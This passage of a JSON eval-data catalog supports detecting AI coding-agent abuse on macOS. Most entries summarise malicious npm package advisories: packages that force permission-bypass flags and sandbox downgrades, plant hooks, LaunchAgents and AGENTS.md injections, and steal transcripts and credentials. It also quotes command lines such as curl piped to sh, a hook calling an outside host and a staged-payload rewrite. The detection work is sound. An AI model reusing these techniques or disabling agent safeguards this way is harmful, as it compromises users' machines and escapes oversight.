@@ -1,0 +1,2116 @@
+{
+ "generated": "2026-11-04",
+ "description": "Public part of the eval-data catalog for tangent's macOS agent-abuse evals: sources that may be redistributed, with the local copies under sources/. value is 1-5 (5 = most useful).",
+ "eaa_catalog": "eaa-catalog.json",
+ "items": [
+  {
+   "id": "SRC-001",
+   "name": "AgentDFIR labeled attack/benign corpus (incl. 5 macOS eslogger cases)",
+   "url": "https://github.com/efij/AgentDFIR/tree/main/internal/corpus/testdata",
+   "related_urls": [
+    "https://github.com/efij/AgentDFIR"
+   ],
+   "angles": [
+    "telemetry",
+    "footprints"
+   ],
+   "kind": "benchmark",
+   "what": "Synthetic, machine-written DFIR corpus for AI agents: 126 case dirs (51 attack, 75 benign; only 34 name a benign 'twin'), each case.json with note, expect/allow rule ids and artifact files. Artifacts mimic agent state: 119 Claude Code transcripts under .claude/projects, MCP gateway/client logs, plugin trees (hooks.json, installed_plugins.json, known_marketplaces.json), Cursor extensions, Continue sessions, Windsurf memories, Tetragon JSONL and evtx. Five macOS cases carry eslogger.jsonl (schema 1, msg v7-v9, 3-11 events): 2 attacks (agent drops LaunchAgent + security find-generic-password -w + FDA tcc_modify; agent sudo unloads auditd and unlinks transcript) and 3 benign (human sudo during agent session; LaunchAgent/keychain by user shell; stream missing exec). internal/endpoint/testdata/macos/eslogger_synthetic.jsonl: 34 lines, ~25 ES types, one invented future type, 3 malformed lines. unifiedlog_scrubbed.ndjson is the only real (scrubbed) data. 330 files, 693 KB at 5be622d4.",
+   "license": "MIT (repo LICENSE 'Copyright (c) 2026 Efi Jeremiah'; GitHub API spdx MIT)",
+   "redistributable": "yes",
+   "published": "commit 5be622d4, 2026-10-26 (repo created 2026-08-31)",
+   "in_eaa_catalog": false,
+   "eaa_techniques": [
+    "EAA-001",
+    "EAA-002",
+    "EAA-003",
+    "EAA-004",
+    "EAA-005",
+    "EAA-009",
+    "EAA-010",
+    "EAA-015",
+    "EAA-016",
+    "EAA-017",
+    "EAA-018"
+   ],
+   "eslogger_visible": "The 5 eslogger.jsonl cases are ES events (exec, fork, create, close, tcc_modify, sudo, signal, unlink). Transcript/plugin fixtures are files, not events: their writes would show as create/rename/close; tool-call content would not.",
+   "how_to_use": "Replay the 2 macOS attacks as positives and 3 benign as hard negatives (same shape, different initiator). Turn plugin-hook, CLAUDE.md-then-subagent, windsurf-global-rules, skill-from-fetched-page and transcript-deletion cases into synthetic eslogger sequences. Use eslogger_synthetic.jsonl for parser robustness.",
+   "downloaded_to": [
+    "datasets/agentdfir-corpus"
+   ],
+   "value": 5
+  },
+  {
+   "id": "SRC-002",
+   "name": "claude-all-config: one postinstall writes Claude, Gemini, Codex and Kiro configs, MCP relay and PATH shims",
+   "url": "https://raw.githubusercontent.com/ossf/malicious-packages/33cdd8087fa0dde00839cac62b2630d07453f72b/osv/malicious/npm/claude-all-config/MAL-2026-4522.json",
+   "related_urls": [],
+   "angles": [
+    "incidents"
+   ],
+   "kind": "incident-or-advisory",
+   "what": "MAL-2026-4522 (2026-05-19). postinstall.js writes config into ~/.claude/, ~/.gemini/, ~/.codex/, ~/.kiro/: (1) mcp.json registers a 'telegram' MCP server with a hardcoded bot token relaying to the author; (2) .env.example ships live author-owned Z.AI, MiniMax, Context7, Exa keys copied into ~/.claude/.env etc.; (3) symlink shims ~/.local/bin/gemini and ~/.local/bin/codex source the author env before exec'ing the real tool, gemini shim appends --yolo; (4) ~/.claude/settings.json and ~/.gemini/settings.json grant Bash(*), Write(*), WebFetch(*), autoAccept:true; launcher exports IS_SANDBOX=1 and forces --dangerously-skip-permissions; (5) if uvx is missing runs `curl -LsSf https://astral.sh/uv/install.sh | sh`.",
+   "license": "Apache-2.0 (OSSF malicious-packages)",
+   "redistributable": "yes",
+   "published": "2026-05-19",
+   "in_eaa_catalog": false,
+   "eaa_techniques": [
+    "EAA-014",
+    "EAA-006",
+    "EAA-007",
+    "EAA-008",
+    "EAA-002"
+   ],
+   "eslogger_visible": "Creates/writes across four agent homes by one node postinstall within seconds (fan-out signature); symlink creates in ~/.local/bin; exec of curl and sh; later shim -> real gemini --yolo / claude --dangerously-skip-permissions exec chains. IS_SANDBOX only if exec env is captured.",
+   "how_to_use": "Canonical EAA-014 case. Rule: one process writing config under >=2 agent homes within N seconds. Watch ~/.local/bin/<agent> shims (command shadowing).",
+   "downloaded_to": [
+    "datasets/osv-mal-ai-agent"
+   ],
+   "value": 5
+  },
+  {
+   "id": "SRC-006",
+   "name": "npm chatgpt-desktop-setup / @decoopus/chatgpt-setup: Codex config to approval never, danger-full-access, root paths, third-party gateway",
+   "url": "https://raw.githubusercontent.com/ossf/malicious-packages/33cdd8087fa0dde00839cac62b2630d07453f72b/osv/malicious/npm/chatgpt-desktop-setup/MAL-2026-18056.json",
+   "related_urls": [],
+   "angles": [
+    "incidents"
+   ],
+   "kind": "incident-or-advisory",
+   "what": "MAL-2026-18056 and MAL-2026-18053, 2026-10-19. Running the bin (chatgpt-setup/codex-setup): (1) rewrites ~/.codex/config.toml with approval_policy='never', sandbox_mode='danger-full-access', model_provider base_url https://api.vokes.in/v1 (18056 adds providers chatgpt_pro_5x / gpt-6-astra); (2) edits ~/.codex/.codex-global-state.json: agent-mode 'full-access', sandboxPolicy.type dangerFullAccess, project rootPaths widened to / and $HOME (18056 adds Downloads). 18053: not from a lifecycle hook or require(); the user must run the bin.",
+   "license": "Apache-2.0 (OSSF malicious-packages)",
+   "redistributable": "yes",
+   "published": "2026-10-19",
+   "in_eaa_catalog": false,
+   "eaa_techniques": [
+    "EAA-002",
+    "EAA-007"
+   ],
+   "eslogger_visible": "open/write or rename of ~/.codex/config.toml and ~/.codex/.codex-global-state.json by node (npx/bin). Content (approval_policy, sandbox_mode, rootPaths) needs a read after close.",
+   "how_to_use": "Case: Codex permission downgrade by a non-codex writer. Watch ~/.codex/.codex-global-state.json explicitly in judge context.",
+   "downloaded_to": [
+    "datasets/osv-mal-ai-agent"
+   ],
+   "value": 5
+  },
+  {
+   "id": "SRC-007",
+   "name": "npm packages that rewrite Claude Code/Desktop gateway and trust settings (api-anthropic, anthropic-setup, finkrouter, panrouter, creditgauge, bingocode, claude-desktop-setup)",
+   "url": "https://osv.dev/MAL-2026-18055",
+   "related_urls": [],
+   "angles": [
+    "incidents"
+   ],
+   "kind": "incident-or-advisory",
+   "what": "(a) api-anthropic MAL-2026-18055 (2026-10-19): CLI writes env.ANTHROPIC_BASE_URL=https://api-anthropic.help and ANTHROPIC_AUTH_TOKEN into ~/.claude/settings.json and hasTrustDialogAccepted=true, hasClaudeMdExternalIncludesApproved=true into ~/.claude.json for cwd and $HOME. (b) anthropic-setup MAL-2026-12510 (2026-08-05): `npx anthropic-setup sk-ant-...` writes ANTHROPIC_BASE_URL https://sugarball.vercel.app, ANTHROPIC_API_KEY and apiKeyHelper `echo '<key>'`. (c) finkrouter MAL-2026-4563 (2026-05-22): writes ~/.fink/sentinel.js, appends `(cd ~ && node ~/.fink/sentinel.js &) # Fink Sentinel` to ~/.bashrc, ~/.zshrc, ~/.profile; git clone/fetch/reset --hard + npm install in ~/.fink; purgeCaveman() deletes a rival's hooks/agents/statusLine from settings.json and '## Caveman' sections from CLAUDE.md. (d) panrouter MAL-2026-6133 (2026-06-18): ANTHROPIC_BASE_URL=http://127.0.0.1:50816 plus detached node relay_client.cjs with WebSocket to wss://jiuling.xyz/ws feeding execSync. (e) creditgauge MAL-2026-10633 (2026-07-15): settings.json with BASE_URL api.minimaxi.com/anthropic + hardcoded token, statusLine running scripts/wrapper.sh from the plugin cache for github:cwf818/topgauge-cc (enabledPlugins) every 10 s, defaultMode bypassPermissions, skipDangerousModePermissionPrompt true. (f) bingocode MAL-2026-4497 (2026-05-22): bin.claude shadows the official CLI; first run deploys ~/.claude/bingo/settings.json with ANTHROPIC_BASE_URL http://127.0.0.1:3456; postinstall copies skills into ~/.claude/skills/. (g) claude-desktop-setup MAL-2026-18059 (2026-10-19): writes inferenceGatewayBaseUrl/ApiKey to claude_desktop_config.json and to managed prefs com.anthropic.claudefordesktop via `defaults write`, then deletes Session Storage, Local Storage, IndexedDB, Network, Partitions, GPUCache, Code Cache from the Claude Desktop app dir.",
+   "license": "Apache-2.0 (OSSF malicious-packages)",
+   "redistributable": "yes",
+   "published": "2026-05-22..2026-10-19",
+   "in_eaa_catalog": false,
+   "eaa_techniques": [
+    "EAA-007",
+    "EAA-002",
+    "EAA-003",
+    "EAA-008",
+    "EAA-009",
+    "EAA-017"
+   ],
+   "eslogger_visible": "open/write/rename of ~/.claude/settings.json, ~/.claude.json, ~/.claude/bingo/settings.json by node (npx/package bin, not claude); writes to ~/.bashrc, ~/.zshrc, ~/.profile, ~/.fink/sentinel.js; exec of git clone/fetch/reset and npm install; exec of `defaults write com.anthropic.claudefordesktop ...` (plist write itself by cfprefsd); unlink burst under the Claude Desktop app-data dir; exec of detached node relay_client.cjs. Not visible: gateway traffic; values need a content read.",
+   "how_to_use": "One case per package. Path rules: non-claude writers of settings.json/.claude.json; defaults write com.anthropic.claudefordesktop; mass unlink in Claude Desktop app data. Judge content: ANTHROPIC_BASE_URL not api.anthropic.com, apiKeyHelper of echo, statusLine into plugin cache, hasTrustDialogAccepted for $HOME. Hard negative: user-set LiteLLM/corporate gateway.",
+   "downloaded_to": [
+    "datasets/osv-mal-ai-agent"
+   ],
+   "value": 5
+  },
+  {
+   "id": "SRC-008",
+   "name": "npm remote-control daemons driving local agents with permission bypass (agenthub-multiagent-mcp, @addai/*, cc2wechat, santaclaude, conductor-cli, remote-claude-daemon, sensorium-mcp, claude-remote-agent, claude-team-tracker)",
+   "url": "https://raw.githubusercontent.com/ossf/malicious-packages/33cdd8087fa0dde00839cac62b2630d07453f72b/osv/malicious/npm/agenthub-multiagent-mcp/MAL-2026-13399.json",
+   "related_urls": [],
+   "angles": [
+    "incidents"
+   ],
+   "kind": "incident-or-advisory",
+   "what": "OSV 2026-07-13..08-07. (a) agenthub-multiagent-mcp MAL-2026-13399: worker.js on wss://agenthub.contetial.com writes each dispatch to a prompt file and spawns `bash run-claude.sh` -> `claude -p \"$PROMPT\" --dangerously-skip-permissions --max-turns N --mcp-config...`; macOS LaunchAgent com.agenthub.worker.plist (RunAtLoad, KeepAlive), systemd unit or Startup.vbs; package.json claims anthropics/agenthub. (b) @addai/ainode, entity-runtime, node (13409-13411): poll Supabase, launch claude/codex/kimi/gemini/grok in node-pty via login shell; ensureBypassPermissionsAccepted() writes skipDangerousModePermissionPrompt: true to ~/.claude/settings.json; probeCapabilities() reads ~/.codex/auth.json, ~/.kimi-code/credentials/*.json, ~/.kimi/config, ~/.gemini/oauth_creds.json, ~/.gemini/.env, ~/.grok/auth.json. (c) @aster110/cc2wechat 13520: tmux session running claude --dangerously-skip-permissions fed by load-buffer/paste-buffer/send-keys; alt backend codex exec --json --dangerously-bypass-approvals-and-sandbox. (d) @cliphijack/santaclaude 13363: tmux send-keys -l, writes ~/.santaclaude-target, exits 75 and re-execs `npx -y @cliphijack/santaclaude@<server version>`; hooks sc-notify.sh/sc-stop.sh POST via curl. (e) @love-moon/conductor-cli 13428: node-pty runs codex/claude with bypass flags, writes them into config.yaml. (f) remote-claude-daemon 13455: `claude --continue -p --dangerously-skip-permissions` plus a Swift SCStream screen-capture helper on macOS. (g) sensorium-mcp 10747: Telegram prompts; send_file MCP tool can send ~/.ssh/id_rsa, ~/.aws/credentials, ~/.npmrc. (h) claude-remote-agent 13376: pty-bridge.py execs claude; reads ~/.claude/projects/*.jsonl on request. (i) claude-team-tracker 10473: postinstall opens /dev/tty; cron + systemd --user + loginctl enable-linger, or KeepAlive LaunchAgent; reads ~/.claude/.credentials.json and calls api.anthropic.com/api/oauth/profile.",
+   "license": "Apache-2.0 (OSSF malicious-packages)",
+   "redistributable": "yes",
+   "published": "2026-07-13..2026-08-07",
+   "in_eaa_catalog": false,
+   "eaa_techniques": [
+    "EAA-001",
+    "EAA-002",
+    "EAA-005",
+    "EAA-015"
+   ],
+   "eslogger_visible": "exec of claude/codex with bypass flags parented by node, bash, tmux or python rather than a terminal shell; exec of tmux send-keys/paste-buffer; opens of ~/.claude/projects/*.jsonl, ~/.codex/auth.json, ~/.gemini/oauth_creds.json, ~/.claude/.credentials.json by non-agent processes; write of ~/.claude/settings.json; LaunchAgent create + btm_launch_item_add; npx -y re-exec loops; possibly tcc_modify for screen capture (inferred). Not visible: C2, prompt content.",
+   "how_to_use": "Strong EAA-001+002 (daemon-spawned agent with bypass flags) and EAA-005 cases; a btm_launch_item_add whose program is a node worker. Hard negatives: user's own tmux running claude --dangerously-skip-permissions in a devcontainer; official Claude Remote Control.",
+   "downloaded_to": [
+    "datasets/osv-mal-ai-agent"
+   ],
+   "value": 5
+  },
+  {
+   "id": "SRC-009",
+   "name": "npm transcript and telemetry harvesters (monty-data, llm-interceptor, oh-langfuse, code-tool-langfuse, reasonix-plugmem, base_parts_ai)",
+   "url": "https://raw.githubusercontent.com/ossf/malicious-packages/33cdd8087fa0dde00839cac62b2630d07453f72b/osv/malicious/npm/llm-interceptor/MAL-2026-13370.json",
+   "related_urls": [],
+   "angles": [
+    "incidents"
+   ],
+   "kind": "incident-or-advisory",
+   "what": "OSV 2026-05-20..08-05. (a) monty-data MAL-2026-6362: postinstall `node bin/cli.js` walks ~/.claude, ~/.codex, ~/.cursor and macOS Cursor globalStorage, uploads all conversations to Supabase; reads ~/.codex/auth.json id_token email; runs git config --global user.name/email and gh auth status. (b) llm-interceptor MAL-2026-13370: postinstall runSetup(); Cursor/Claude/Codex tailers walk ~/.cursor/projects/*/agent-transcripts and Claude transcript paths and POST turns to a trycloudflare tunnel; adds a Claude SessionEnd hook; Windows watchdog under ~/.llm-interceptor. (c) oh-langfuse MAL-2026-4625: writes LANGFUSE_BASEURL=http://120.46.221.227:3000 and keys into ~/.claude/settings.json, ~/.codex/config.toml and OpenCode env files; installs a downloaded Stop hook. code-tool-langfuse MAL-2026-4532: writes settings.json, ~/.bashrc, ~/.zshrc, overwrites ~/.config/opencode/node_modules/opencode-plugin-langfuse/dist/index.js, unzips into ~/.claude/hooks/ as a Stop hook. (d) reasonix-plugmem MAL-2026-4780: <cwd>/.reasonix/settings.json PostToolUse/UserPromptSubmit hooks running memory_manager.py, which posts the apiKey from ~/.reasonix/config.json. (e) base_parts_ai MAL-2026-6228: SessionStart hook in ~/.claude/settings.json running `curl -s -m 5 https://jai.jaskle.cn/hm/pub/ai_tip?cli=cc-<os>_<arch>`; update path `npm install -g https://...aliyuncs.com/npm_pkg/base_parts_ai-<ver>.tgz --force`.",
+   "license": "Apache-2.0 (OSSF malicious-packages)",
+   "redistributable": "yes",
+   "published": "2026-05-20..2026-08-05",
+   "in_eaa_catalog": false,
+   "eaa_techniques": [
+    "EAA-005",
+    "EAA-012",
+    "EAA-003",
+    "EAA-021"
+   ],
+   "eslogger_visible": "Bulk opens of ~/.claude/projects/**/*.jsonl, ~/.cursor/projects/*/agent-transcripts, ~/.codex/auth.json by node postinstall; writes to settings.json, config.toml, rc files, ~/.claude/hooks/*, opencode plugin dist/index.js; exec of curl from a claude-parented hook at session start; exec of git config --global, gh auth status, npm install -g <url>. Not visible: upload destinations.",
+   "how_to_use": "EAA-005 (bulk transcript reads by a lifecycle process) and EAA-012 (observability endpoint written into agent settings). Many-file read under ~/.claude/projects is a good telling-read rule. Hard negatives: user's own Langfuse/OTel (documented OTEL_*), ccusage-style local readers.",
+   "downloaded_to": [
+    "datasets/osv-mal-ai-agent"
+   ],
+   "value": 5
+  },
+  {
+   "id": "SRC-010",
+   "name": "opencode-optimised-toolings and @beloved-lenora/opencode-* plugins: agent binary replacement, AGENTS.md injection, staged script under Application Support",
+   "url": "https://raw.githubusercontent.com/ossf/malicious-packages/33cdd8087fa0dde00839cac62b2630d07453f72b/osv/malicious/npm/opencode-optimised-toolings/MAL-2026-13452.json",
+   "related_urls": [],
+   "angles": [
+    "incidents"
+   ],
+   "kind": "incident-or-advisory",
+   "what": "(a) opencode-optimised-toolings@4.0.0 MAL-2026-13452 (2026-08-06): on plugin load, without prompt, downloads OpenCode source from github.com/anomalyco/opencode, runs bun install and build; renames the on-PATH opencode to <path>.alonix-toolings-backup / .alonix-toolings-incoming-<ts> and copies the new build into place; rewrites ~/.config/opencode/opencode.jsonc, injects an ALONIX block into AGENTS.md, pins itself @latest in ~/.config/opencode/tui.json. (b) @beloved-lenora/opencode-shell-guard MAL-2026-17907 (+6 siblings 17903-17909, 2026-10-16): when a command contains `npm run build`, decrypts a payload from @beloved-lenora/opencode-shared-rpc to ~/Library/Application Support/.k7Qm2/vX9pL4.sh and rewrites the command to `(npm run build || bash '<staged>') || rm -f '<staged>'`.",
+   "license": "Apache-2.0 (OSSF malicious-packages)",
+   "redistributable": "yes",
+   "published": "2026-08-06 / 2026-10-16",
+   "in_eaa_catalog": false,
+   "eaa_techniques": [
+    "EAA-021",
+    "EAA-004",
+    "EAA-009"
+   ],
+   "eslogger_visible": "rename of the opencode executable and create at the same path; exec of bun install/build under a temp dir parented by opencode; writes to opencode.jsonc, tui.json, AGENTS.md; create of ~/Library/Application Support/.k7Qm2/vX9pL4.sh, the sh -c exec with the rewritten argv, bash on the staged file, then unlink. The in-process rewrite itself is invisible; its result is in argv.",
+   "how_to_use": "EAA-021 case: rename/overwrite of an agent CLI binary by the agent's own plugin. Rule: write/rename of the resolved path of any agent binary by anything but a package manager upgrade. Hard negatives: npm i -g opencode-ai, brew upgrade.",
+   "downloaded_to": [
+    "datasets/osv-mal-ai-agent"
+   ],
+   "value": 5
+  },
+  {
+   "id": "SRC-011",
+   "name": "OSSF malicious-packages: 106 OSV reports of npm/PyPI/VSCode packages that abuse AI-agent config",
+   "url": "https://github.com/ossf/malicious-packages",
+   "related_urls": [],
+   "angles": [
+    "incidents"
+   ],
+   "kind": "incident-or-advisory",
+   "what": "OSV JSON selected with 59 in-repo code-search queries (hits/*.q), kept only when details mention agent paths, hooks, MCP, transcripts, bypass flags or agent CLIs. 106 records (103 npm, 2 PyPI, 1 VSCode); 21 withdrawn (16 are 0x2ai-*); dated 2025-11..2026-10-29, mostly 2026-05..10. Fields: id, summary, details (long prose with exact paths/flags/endpoints), affected[].package, versions, database_specific, references, credits, withdrawn. index.tsv one row per record; 62 rows have regex-extracted agent indicators. Clusters: gateway rewrites of ~/.claude/settings.json and trust flags in ~/.claude.json; Codex config downgrades; SessionStart/Stop/UserPromptSubmit/PostToolUse hook planting; project CLAUDE.md/.mcp.json/.claude/commands drops; remote-control daemons spawning claude/codex with bypass flags; transcript harvesting; reads of ~/.claude/.credentials.json and ~/.codex/auth.json; agent binary replacement; LaunchAgent persistence. The two MAL ids the catalog cites (MAL-2026-11069, MAL-2025-47604) are not in the download. Reports only, no packages.",
+   "license": "Apache-2.0 (GitHub API spdx for ossf/malicious-packages, re-checked)",
+   "redistributable": "yes",
+   "published": "commit 33cdd808, 2026-11-04T16:21Z; records 2025-11..2026-10-29",
+   "in_eaa_catalog": false,
+   "eaa_techniques": [
+    "EAA-001",
+    "EAA-002",
+    "EAA-003",
+    "EAA-004",
+    "EAA-005",
+    "EAA-006",
+    "EAA-007",
+    "EAA-008",
+    "EAA-009",
+    "EAA-012",
+    "EAA-014",
+    "EAA-015",
+    "EAA-021"
+   ],
+   "eslogger_visible": "Described writes (~/.claude/settings.json, ~/.claude.json, ~/.codex/config.toml, .mcp.json, CLAUDE.md, ~/.claude/skills/*, LaunchAgents) and execs (npm lifecycle, node, bash, git clone, claude/codex with bypass flags, tmux send-keys, defaults write) are all eslogger-visible. Network relays and WebSocket/Supabase/Telegram C2 are not.",
+   "how_to_use": "One synthesized eslogger case per package or cluster; package-specific paths become path rules (~/.claude/bingo/settings.json, ~/.fink/sentinel.js, ~/.apex/agent/mcp.json, ~/.codex/.codex-global-state.json, ~/.config/opencode/opencode.jsonc and tui.json, ~/.reasonix/settings.json, ~/.llm-interceptor); withdrawn records as borderline cases. index.tsv is the entry point. OSV npm export (220 MB) not downloaded, so selection depends on code-search recall.",
+   "downloaded_to": [
+    "datasets/osv-mal-ai-agent"
+   ],
+   "value": 5
+  },
+  {
+   "id": "SRC-013",
+   "name": "ES malware captures catalog (Mac Monitor captures of macOS malware detonations)",
+   "url": "https://github.com/txhaflaire/es-malware-captures-catalog",
+   "related_urls": [],
+   "angles": [
+    "telemetry",
+    "macos-threats"
+   ],
+   "kind": "telemetry",
+   "what": "Real ES telemetry from detonating macOS malware in a VM (Thijs Xhaflaire). Four JSON files, ~108 MiB: atomicstealer (1,497 events), macsync stealer (2,144), shub stealer (2,500), BlueNoroff token-vesting docx/scpt (27,940). Keys are eslogger keys (event, process, global_seq_num, version, schema_version, mach_time) plus Mac Monitor fields (es_event_type, action_type_string, context, target_path, sensor_id). Types: EXEC, FORK, EXIT, CREATE, RENAME, SETMODE, LINK, MMAP, XPC_CONNECT, IOKIT_OPEN, PTY_GRANT, AUTHORIZATION_*, TCC_MODIFY (4, AMOS), BTM_LAUNCH_ITEM_ADD (1, AMOS). No OPEN, CLOSE or UNLINK. Each capture spans under a minute; no agent, no dev workstation.",
+   "license": "MIT (repo LICENSE 'Copyright (c) 2026 Thijs Xhaflaire'; GitHub API spdx MIT)",
+   "redistributable": "yes",
+   "published": "captures 2026-02-18..2026-03-02; commit 7be62292 2026-03-02",
+   "in_eaa_catalog": false,
+   "eaa_techniques": [],
+   "eslogger_visible": "Already ES events. Process trees, staging creates/renames, LaunchAgent create + BTM add, tcc_modify visible. Credential-file reads are absent (no open events captured).",
+   "how_to_use": "Real non-agent positives for persistence and tcc_modify; parser robustness on Mac Monitor-flavoured JSON; check the agent-scoped filter neither drops nor mislabels non-agent persistence. BlueNoroff (~13k create+setmode in <1 min) is a load test. Records may hold the lab VM's user/host names.",
+   "downloaded_to": [
+    "datasets/es-malware-captures"
+   ],
+   "value": 5
+  },
+  {
+   "id": "SRC-017",
+   "name": "Cline source: ~/.cline data dirs, env overrides, hooks/skills/rules/plugins search paths, MCP settings create pattern",
+   "url": "https://raw.githubusercontent.com/cline/cline/7a7878cb52fc33967d8b464b3e3d899beac42d4d/sdk/packages/shared/src/storage/paths.ts",
+   "related_urls": [],
+   "angles": [
+    "footprints"
+   ],
+   "kind": "agent-footprint",
+   "what": "At 7a7878cb. CLINE_DIR or ~/.cline; CLINE_DATA_DIR, CLINE_SESSION_DATA_DIR; db connectors.db, cron.db, tasks.db; settings/providers.json (CLINE_PROVIDER_SETTINGS_PATH), settings/global-settings.json, cline_mcp_settings.json (CLINE_MCP_SETTINGS_PATH). Skills: .clinerules/skills, .cline/skills, .claude/skills, .agents/skills, ~/.cline/skills, ~/.agents/skills. Agents .cline/agents, ~/.cline/agents. Hooks ~/Documents/Cline/Hooks, ~/.cline/hooks, .clinerules/hooks, .cline/hooks. ~/.agents/AGENTS.md. Global rules ~/.cline/rules, ~/Cline/Rules, ~/Documents/Cline/Rules. Plugins .cline/plugins, ~/.cline/plugins, ~/Documents/Cline/Plugins (.js/.ts modules); ~/.agents/plugins. VS Code extension: globalStorage tasks/<id>/{api_conversation_history.json, context_history.json, ui_messages.json, task_metadata.json}, cline_mcp_settings.json, .clinerules/{workflows,hooks,skills}, .cursor/rules, .cursorrules, .windsurfrules, AGENTS.md. First create of MCP settings: write empty <file>.tmp.<pid>.<ms>.<rand> (wx), hard-link it to cline_mcp_settings.json, unlink the tmp.",
+   "license": "Apache-2.0 (GitHub API spdx)",
+   "redistributable": "yes",
+   "published": "commit 7a7878cb, 2026-11-04",
+   "in_eaa_catalog": false,
+   "eaa_techniques": [
+    "EAA-003",
+    "EAA-004",
+    "EAA-005",
+    "EAA-006",
+    "EAA-009",
+    "EAA-015",
+    "EAA-019"
+   ],
+   "eslogger_visible": "File paths visible; plugin JS/TS loads in-process (the write is the key event); task transcripts are writes by Code Helper (Plugin); MCP first-create shows as tmp create+unlink (the link event is outside our set).",
+   "how_to_use": "Adds Cline coverage (paths above). Benign tmp regex cline_mcp_settings\\.json\\.tmp\\.\\d+\\.\\d+\\.[a-z0-9]+.",
+   "downloaded_to": [],
+   "value": 4
+  },
+  {
+   "id": "SRC-019",
+   "name": "Codex source: built-in memory consolidation agent, system skills, plugin store (benign control-plane writes)",
+   "url": "https://raw.githubusercontent.com/openai/codex/48524f337a84b570f0c2453ca43ec9a1a29375c0/codex-rs/memories/README.md",
+   "related_urls": [],
+   "angles": [
+    "footprints"
+   ],
+   "kind": "agent-footprint",
+   "what": "memories/README.md:96-136: Phase 2 syncs raw_memories.md and rollout_summaries/ under the memories root (git baseline ~/.codex/memories/.git), writes phase2_workspace_diff.md, then spawns an internal consolidation sub-agent (no approvals, no network, local writes) producing MEMORY.md, memory_summary.md, skills/; resets the baseline on success. skills/src/lib.rs install_system_skills: on fingerprint change remove_dir_all $CODEX_HOME/skills/.system, rewrite embedded skills, write .codex-system-skills.marker. core-plugins/store.rs: plugins/data; remote install metadata via NamedTempFile+persist; installs stage in plugin-install-* tempdir, read .codex-plugin/plugin.json, rename into place with plugin-backup-* rollback.",
+   "license": "Apache-2.0",
+   "redistributable": "yes",
+   "published": "commit 48524f33, 2026-11-04",
+   "in_eaa_catalog": false,
+   "eaa_techniques": [
+    "EAA-004",
+    "EAA-009",
+    "EAA-013",
+    "EAA-021"
+   ],
+   "eslogger_visible": "create/write/unlink under ~/.codex/memories/** (incl. .git objects, by codex or git children); unlink+create of ~/.codex/skills/.system/** after updates; plugin-install-*/plugin-backup-* renames under the plugin cache.",
+   "how_to_use": "Hard negatives: codex and its git children rewriting its own memory and skills with no user prompt. The same paths written by a non-codex process, or new skills outside skills/.system, are EAA-004/009 positives.",
+   "downloaded_to": [],
+   "value": 4
+  },
+  {
+   "id": "SRC-020",
+   "name": "Codex source: external-agent migration reads Claude Code and Cursor config, transcripts, plugins",
+   "url": "https://raw.githubusercontent.com/openai/codex/48524f337a84b570f0c2453ca43ec9a1a29375c0/codex-rs/external-agent-migration/src/source/cla.rs",
+   "related_urls": [],
+   "angles": [
+    "footprints"
+   ],
+   "kind": "agent-footprint",
+   "what": "Claude side: .claude, CLAUDE.md, settings.json, settings.local.json, ~/Library/Application Support/Claude, plugins/known_marketplaces.json, extraKnownMarketplaces/enabledPlugins, .mcp.json, .claude.json, projects/*/memory, projects/**/*.jsonl, hooks from settings files. Cursor side: .cursor, .cursorrules, cli-config.json, cli.json, hooks.json, mcp.json, .cursor-plugin/marketplace.json, plugins/marketplaces, plugins/cache, projects/<p>/agent-transcripts/**/*.jsonl, skills and skills-cursor. Targets: <CODEX_HOME parent>/.agents/skills (~/.agents/skills) and $CODEX_HOME/config.toml or <repo>/.codex/config.toml.",
+   "license": "Apache-2.0",
+   "redistributable": "yes",
+   "published": "commit 48524f33, 2026-11-04",
+   "in_eaa_catalog": false,
+   "eaa_techniques": [
+    "EAA-005",
+    "EAA-014",
+    "EAA-016"
+   ],
+   "eslogger_visible": "Opens by codex (app-server) of Claude/Cursor transcripts, configs, hooks and marketplaces, then creates under ~/.agents/skills and tmp+rename onto config.toml.",
+   "how_to_use": "Key hard negative for EAA-005/014/016: signed Codex reading other agents' config and transcripts during migration. Positive twin: the same read set by node, python or curl. Confirms Cursor transcript and plugin cache paths.",
+   "downloaded_to": [],
+   "value": 4
+  },
+  {
+   "id": "SRC-021",
+   "name": "Codex source: sessions/rollouts, SQLite state DBs, keyring service",
+   "url": "https://raw.githubusercontent.com/openai/codex/48524f337a84b570f0c2453ca43ec9a1a29375c0/codex-rs/rollout/src/list.rs",
+   "related_urls": [],
+   "angles": [
+    "footprints"
+   ],
+   "kind": "agent-footprint",
+   "what": "At 48524f33: SESSIONS_SUBDIR 'sessions', ARCHIVED_SESSIONS_SUBDIR 'archived_sessions'; layout ~/.codex/sessions/YYYY/MM/DD/rollout-YYYY-MM-DDThh-mm-ss-<uuid>.jsonl; thread/revert gives rollout-<ts>-<conversation_id>_<rollout_id>.jsonl; new sessions defer file creation until persist(), resumed sessions open at once. state/src/sqlite.rs: logs_2, goals_1, memories_1, queue_1, state_5, thread_history_1 .sqlite; CODEX_SQLITE_HOME relocates them. Keyring service 'codex'. codex exec --ephemeral persists no rollout.",
+   "license": "Apache-2.0",
+   "redistributable": "yes",
+   "published": "commit 48524f33, 2026-11-04",
+   "in_eaa_catalog": false,
+   "eaa_techniques": [
+    "EAA-005",
+    "EAA-017"
+   ],
+   "eslogger_visible": "Rollouts: create then repeated writes/closes of sessions/YYYY/MM/DD/rollout-*.jsonl by codex; constant *.sqlite/-wal/-shm churn; reads by non-codex processes are opens; keyring via securityd (no agent file event).",
+   "how_to_use": "Keep reads/unlinks/renames of ~/.codex/sessions/** and archived_sessions/** by non-codex processes; drop codex's own appends and sqlite churn; filename regex as a hard negative.",
+   "downloaded_to": [],
+   "value": 4
+  },
+  {
+   "id": "SRC-022",
+   "name": "Continue source and docs: ~/.continue layout, executable config.ts, .env, permissions.yaml, cn --auto",
+   "url": "https://raw.githubusercontent.com/continuedev/continue/5522c6f44ca0ac3528b37244818fbfa39b5af470/core/util/paths.ts",
+   "related_urls": [
+    "https://docs.continue.dev/cli/tool-permissions"
+   ],
+   "angles": [
+    "footprints"
+   ],
+   "kind": "agent-footprint",
+   "what": "CONTINUE_GLOBAL_DIR or ~/.continue: sessions/ and sessions.json, config.json/config.yaml/config.ts (compiled to out/config.js), .continuerc.json, dev_data/devdata.sqlite, index/index.sqlite, lancedb, .configs/<host>/config.json|config.js (remote), .env, logs/core.log, logs/prompt.log, prompts/*.prompt. Rules read from AGENTS.md, AGENT.md, CLAUDE.md, .continue/rules, .continue/prompts; workspace block types context, models, rules, docs, prompts, data, mcpServers. CLI: ~/.continue/permissions.yaml updated on 'don't ask again'; --auto allows all tools; --readonly; --allow/--ask/--exclude.",
